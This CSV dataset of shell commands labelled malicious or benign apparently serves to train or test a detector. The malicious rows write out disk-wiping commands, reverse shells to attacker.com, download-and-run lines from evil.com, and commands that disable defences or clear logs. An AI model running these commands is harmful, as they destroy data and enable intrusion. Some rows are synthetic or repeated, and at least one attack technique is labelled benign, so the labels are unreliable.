command,label
cat /dev/urandom > /dev/sda,malicious
date,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
find /home -name '*.txt' > output.txt,benign
cat /dev/urandom > /dev/sda,malicious
node --version 2>/dev/null,benign
chmod 777 /etc/shadow,malicious
diskpart select disk 0 clean >/dev/null,malicious
awk '{print $1}' data.txt,benign
pwd --help,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ >/dev/null,malicious
dd if=/dev/zero of=/dev/sda,malicious
nohup cipher /w:C:\,malicious
wget http://malicious.com/malware.exe,malicious
netsh advfirewall set allprofiles state off 2>&1,malicious
passwd user,benign
sudo echo 'Hello World',benign
ssh user@server.com,benign
docker ps > output.txt,benign
uptime --help,benign
chown user:group file.txt,benign
powershell Get-Process,benign
nohup mshta javascript:alert('code execution'),malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
format C: /q /x >/dev/null,malicious
nohup chmod 777 /etc/shadow,malicious
timeout 60 wevtutil cl Security,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ &,malicious
vssadmin delete shadows /all /quiet,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
sdelete -p 10 -s -z C:\,malicious
groups user,benign
echo 'virus' > /etc/passwd,malicious
cipher /w:C:\ 2>&1,malicious
attrib +h +s malware.exe,malicious
dd if=/dev/zero of=/dev/sda,malicious
format C: /q /x,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
cipher /w:C:\,malicious
cat /dev/urandom > /dev/sda,malicious
umount /dev/sdb1,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
wget https://example.com/file.txt,benign
cp file1.txt file2.txt | head -5,benign
who,benign
umount /dev/sdb1,benign
taskkill /f /im antimalware.exe >/dev/null,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe &,malicious
mkdir -p /tmp/test,benign
chmod 755 script.sh,benign
:(){ :|:& };: &,malicious
fdisk -l,benign
(schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon),malicious
dd if=/dev/zero of=/dev/sda,malicious
man ls,benign
:(){ :|:& };:,malicious
crontab -l,benign
cp file1.txt file2.txt,benign
cipher /w:C:\,malicious
powershell Get-Process,benign
wevtutil cl Security >/dev/null,malicious
apt list --installed,benign
mshta javascript:alert('code execution'),malicious
finger user -v,benign
top | head -5,benign
netsh advfirewall set allprofiles state off,malicious
mount,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
attrib +h +s malware.exe,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
msbuild project.csproj,benign
node --version,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
cat /etc/passwd,benign
service apache2 status -v,benign
rsync -av /src/ /dst/ | head -5,benign
curl -I https://google.com 2>/dev/null,benign
history,benign
attrib +h +s malware.exe,malicious
shutdown /r /f /t 0,malicious
tail -f /var/log/syslog,benign
java -version,benign
dd if=/dev/zero of=/dev/sda,malicious
timeout 60 cat /dev/urandom > /dev/sda,malicious
uptime,benign
:(){ :|:& };: &,malicious
mv old.txt new.txt,benign
docker ps,benign
ls -la,benign
crontab -l,benign
nc -l -p 4444 -e /bin/bash,malicious
chmod 755 script.sh 2>/dev/null,benign
sudo htop,benign
free -m,benign
rsync -av /src/ /dst/,benign
wevtutil cl System,malicious
nohup wevtutil cl Security,malicious
cmd /c del /q /s C:\*,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
lsblk,benign
sdelete -p 10 -s -z C:\,malicious
sdelete -p 10 -s -z C:\,malicious
net localgroup administrators hacker /add,malicious
wget https://example.com/file.txt,benign
whoami -v,benign
vmstat | head -5,benign
touch newfile.txt,benign
vmstat,benign
timeout 60 sdelete -p 10 -s -z C:\,malicious
vssadmin delete shadows /all /quiet,malicious
ps aux,benign
attrib +h +s malware.exe,malicious
dd if=/dev/zero of=/dev/sda,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' 2>&1",malicious
"(powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")')",malicious
ps aux,benign
:(){ :|:& };:,malicious
sc stop Windows Defender,malicious
vmstat > output.txt,benign
apt list --installed,benign
pwd,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures >/dev/null,malicious
touch newfile.txt | head -5,benign
net localgroup administrators hacker /add,malicious
diskpart select disk 0 clean >/dev/null,malicious
ncat -lvp 443 -e cmd.exe,malicious
traceroute google.com,benign
uniq sorted.txt,benign
wevtutil cl Security,malicious
diskpart select disk 0 clean,malicious
mv old.txt new.txt,benign
ping -c 4 google.com > output.txt,benign
who,benign
wmic process call create 'cmd.exe /c powershell.exe' &,malicious
htop,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
certutil -hashfile file.txt SHA256,benign
ping -c 4 google.com,benign
docker images,benign
cat /dev/urandom > /dev/sda,malicious
groups user 2>/dev/null,benign
timeout 60 bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
taskkill /f /im antimalware.exe,malicious
sort data.txt,benign
cat /dev/urandom > /dev/sda,malicious
lsblk,benign
pip list 2>/dev/null,benign
(rm -rf /),malicious
wevtutil cl System,malicious
find /home -name '*.txt',benign
sc stop Windows Defender,malicious
curl -I https://google.com,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
lsblk,benign
format C: /q /x,malicious
sdelete -p 10 -s -z C:\,malicious
curl http://evil.com/payload.sh | bash 2>&1,malicious
sc stop Windows Defender,malicious
history > output.txt,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon >/dev/null,malicious
whoami -v,benign
nohup net localgroup administrators hacker /add,malicious
mkfs.ext4 /dev/sda1,malicious
attrib +h +s malware.exe,malicious
last,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll 2>/dev/null,benign
